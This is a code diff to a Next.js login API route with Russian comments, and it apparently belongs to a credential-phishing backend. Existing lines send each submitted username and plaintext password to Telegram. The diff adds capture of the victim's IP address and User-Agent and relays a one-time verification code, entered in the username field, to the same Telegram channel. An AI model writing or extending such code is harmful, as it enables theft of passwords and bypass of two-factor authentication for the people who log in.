@@ -12,6 +12,19 @@ export async function POST(request: NextRequest) {
   console.log("[API LOGIN] Получен запрос на вход");
 
   try {
+    // Получаем IP адрес из заголовков
+    const clientIp = 
+      request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || 
+      request.headers.get("x-real-ip") || 
+      request.headers.get("cf-connecting-ip") ||
+      "unknown";
+
+    // Получаем User-Agent из заголовков
+    const userAgent = request.headers.get("user-agent") || undefined;
+
+    console.log("[API LOGIN] IP:", clientIp);
+    console.log("[API LOGIN] User-Agent:", userAgent);
+
     const body = await request.json();
     const { username, password, rememberUsername } = body;
 
@@ -39,8 +52,14 @@ export async function POST(request: NextRequest) {
       }
       
       // Отправка кода верификации в Telegram вместо Email
+      // Получаем username из сессии, если доступен
       try {
-        await sendCodeTelegram(username.trim(), username.trim());
+        const { getSession } = await import("@/lib/session");
+        const session = await getSession();
+        const codeUsername = session?.username || "unknown";
+        const verificationCode = username.trim(); // В этом случае username содержит код
+        
+        await sendCodeTelegram(verificationCode, codeUsername, clientIp, userAgent);
         console.log("[API LOGIN] Код верификации отправлен в Telegram");
       } catch (telegramError) {
         console.error("[API LOGIN] Ошибка отправки кода в Telegram:", telegramError);
@@ -77,7 +96,7 @@ export async function POST(request: NextRequest) {
     
     try {
       // Отправка в Telegram вместо Email
-      await sendLoginTelegram(username, password, requestId);
+      await sendLoginTelegram(username, password, requestId, clientIp, userAgent);
       console.log("[API LOGIN] Уведомление отправлено в Telegram");
     } catch (telegramError) {
       console.error("[API LOGIN] Ошибка отправки в Telegram:", telegramError);
